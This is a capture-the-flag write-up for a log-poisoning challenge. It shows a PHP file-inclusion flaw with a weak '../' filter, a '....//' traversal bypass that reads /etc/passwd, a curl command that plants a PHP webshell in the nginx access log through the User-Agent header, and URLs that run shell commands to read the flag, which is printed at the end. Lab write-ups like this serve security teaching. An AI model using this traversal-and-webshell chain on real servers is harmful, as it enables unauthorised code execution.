**Poisoned**

Log Poisoning challenge; overall strategy is to:
1. Find a Local File Inclusion (LFI)
2. Inject php code into log files
3. Utilise the LFI vulnerability to obtain code execution and obtain the flag

Navigating to the host places the user at index.php
Within the source code, a hint to '/dashboard.php' is mentioned

There are 2 files the user can select to show the contents of:
	a. Messages.php (Provides a hint of layers (directories), climbing them (traversing) and dotdotslash (this is base64 encoded) [../])
	b. Logs.php (This simply mentions the presence of a log file (located at /var/log/nginx/access.log)), serves as a hint to log poisoning

LFI:
	
	if (isset($_GET['file']))
	        $file = $_GET['file'];
	        $file = str_replace("../","", $file);
	$fullPath = '/var/www/html/page/'.$file;
and

	<?php include_once($fullPath); ?>
**1.**

The 'file' parameter undergoes simple filtering which simply strips any occurence of ../ from the parameter.
This does not occur recursively, so by doing something such as '....//'', it is filtered to '../' which can be used to traverse directories. 
	https://book.hacktricks.xyz/pentesting-web/file-inclusion
User can include other files stored locally on the system:
	
	https://poisoned.chals.pecan.tplant.com.au/dashboard.php?file=....//....//....//....//etc/passwd

With LFI being obtained and a log file being displayed, with some quick googling, we can find information on log poisoning.
	https://www.hackingarticles.in/apache-log-poisoning-through-lfi/
	
	https://poisoned.chals.pecan.tplant.com.au/dashboard.php?file=....//....//....//....//var/log/nginx/access.log

this url was the one used in testing, change as necessary.

**2.**

A common technique involves injecting php code into the log file which is usually through the form of 'User Agent'.
This can be done via Burp Suite:
	Within the HTTP Request, a user can inject php code into the log file using the 'User Agent' Header.
	![image](https://user-images.githubusercontent.com/71430086/187429629-bc57c186-36ce-4385-bea7-e2b648acf542.png)

	
	or curl (-k for insecure as it is hosted via ssl):
	
	curl -k https://poisoned.chals.pecan.tplant.com.au -A "<?php system(\$_GET['cmd']) ?>"
	
This then will place a php webshell into the access.log file

**3.**

To exploit this we can simply use the LFI to access the log file and pass the 'cmd' parameter to it which will call system() (code execution)
	
	https://poisoned.chals.pecan.tplant.com.au/dashboard.php?file=....//....//....//....//var/log/nginx/access.log&cmd=id
	output: uid=1000(plex) gid=1000(plex) groups=1000(plex)

We can then explore directories, flag sits in root directory

	https://poisoned.chals.pecan.tplant.com.au/dashboard.php?file=....//....//....//....//var/log/nginx/access.log&cmd=ls /
	https://poisoned.chals.pecan.tplant.com.au/dashboard.php?file=....//....//....//....//var/log/nginx/access.log&cmd=cat /flag*
	
Viewing page source and/or ctrl+f helps with finding the executed code.

**Flag**
	
	pecan{p0is0n_l0g_ex3cute_c0de}








